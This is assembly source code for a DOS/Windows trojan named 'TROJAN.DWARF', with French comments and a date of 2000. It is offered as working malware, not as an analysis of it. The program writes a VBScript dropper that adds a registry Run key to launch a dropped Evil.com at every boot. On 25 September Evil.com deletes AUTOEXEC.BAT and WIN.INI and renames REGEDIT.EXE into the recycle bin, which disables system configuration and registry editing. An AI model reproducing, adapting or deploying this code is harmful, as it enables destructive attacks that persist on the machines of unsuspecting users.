;Par M.Xxxxxxx XXXXXXX (c)2000                                  09/09/00
;TAILLE : 689 OCTETS
;TESTE LE PREMIERE FOIS AU LYCEE KIRSCHLEGER DE MUNSTER
;DWARF259 CREE DEUX PROGRAMME :
;       -Dwarf.vbs dans C: active Evil.com … chaque dйmarrage                            
;       -Evil.com  dans C:\WINDOWS.
;Le 25 septembre, il renomme REGEDIT.EXE dans la corbeille
;en DWARF.AZE et efface AUTOEXEC.BAT et WIN.INI
                          
.model small
.code
org 100h

TOUT_DEBUT:     jmp FILE1

VERIFICATION:   mov ah,2Ah
                int 21h
                cmp dh,9
                jnz FIN_VIRUS
                cmp dl,25               ;25 SEPTEMBRE ?
                jnz FIN_VIRUS           ;NON : FIN DU TROJAN
AFFICHE:		mov ah,9
				lea dx,MSG
				int 21h
DISQUE: 		mov ah,41h
                mov dx,offset AUTOEXEC
                int 21h                 ;EFFACE AUTOEXEC.BAT
				mov dx,offset WININI
                int 21h                 ;EFFACE WIN.INI
				mov ah,56h
                mov dx,offset REG       ;RENOMME REGEDIT.EXE
                mov di,offset CORBEILLE ;EN DWARF.AZE
				int 21h
FIN_VIRUS:      mov ah,4Ch
                int 21h

MSG     db 7,7,7,'TROJAN.DWARF par PandaKiller (c)2000'
        db 10,10,13,'BOOM! BOOM! BOOM! BOOM! BOOM! BOOM!'
        db 10,13,'      ЫЫЫ  Ы   Ы  ЫЫ  ЫЫЫ   ЫЫЫЫ'
        db 10,13,'      Ы  Ы Ы   Ы Ы  Ы Ы  Ы  Ы   '
        db 10,13,'      Ы  Ы Ы   Ы ЫЫЫЫ ЫЫЫ   ЫЫЫ '
        db 10,13,'      Ы  Ы Ы Ы Ы Ы  Ы Ы Ы   Ы   '
        db 10,13,'      ЫЫЫ   Ы Ы  Ы  Ы Ы  Ы  Ы   $'

WININI		db 'C:\WINDOWS\Win.ini',0
AUTOEXEC  	db 'C:\autoexec.bat',0
REG  		db 'C:\WINDOWS\Regedit.exe',0
CORBEILLE 	db 'C:\RECYCLED\dwarf.aze',0
progl2 equ $-VERIFICATION

FILE1:          mov ah,3Ch
                xor cx,cx
                mov dx,offset NOM1
                int 21h                 ;CREATION DU 1ER FICHIER
                xchg ax,bx
                mov ah,40h
                mov cx,progl1           ;LONGUEUR DU PROGRAMME
                mov dx,offset prog1     ;DEBUT DU PROGRAMME
                int 21h                 ;ECRITURE
                mov ah,3Eh
                int 21h                 ;FERMETURE
FILE2:          mov ah,3Ch
                xor cx,cx
                mov dx,offset NOM2
                int 21h                 ;CREATION DU 2ND FICHIER
                xchg ax,bx
                mov ah,40h
                mov cx,progl2           ;LONGUEUR DU PROGRAMME
                lea dx,VERIFICATION     ;DEBUT DU PROGRAMME
                int 21h                 ;ECRITURE
                mov ah,3Eh
                int 21h                 ;FERMETURE
FIN:            mov ah,4Ch
                int 21h

NOM1    db 'c:\Dwarf.vbs',0
NOM2    db 'c:\WINDOWS\Evil.com',0
prog1   db 'rem DwArF.vbs by Panda (c)2000',0Dh,0Ah
        db 'msgbox "C''EST PARTI",vbcritical',0Dh,0Ah
        db 'Dim W',0Dh,0Ah
        db 'Set W = Wscript.CreateObject("WScript.Shell")',0Dh,0Ah
        db 'W.Regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows'
        db '\CurrentVersion\Run\DwArF", "C:\WINDOWS\Evil.com"'
progl1  equ $-prog1
end TOUT_DEBUT
